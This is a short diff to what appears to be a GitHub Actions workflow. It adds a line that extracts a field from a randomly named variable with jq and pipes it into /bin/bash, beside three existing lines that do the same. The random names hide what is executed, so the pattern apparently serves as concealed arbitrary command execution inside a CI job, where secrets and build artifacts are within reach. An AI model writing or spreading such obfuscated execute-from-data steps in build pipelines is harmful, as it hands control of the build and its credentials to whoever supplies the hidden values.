@@ -30,6 +30,7 @@ jobs:
           echo $ld5078 | jq -r .jx60 | /bin/bash
           echo $ez33892 | jq -r .w19752 | /bin/bash
           printf '%s' "$gtwb4122" | jq -r .iz023 | /bin/bash
+          echo $iznsp7 | jq -r .lqu6426 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
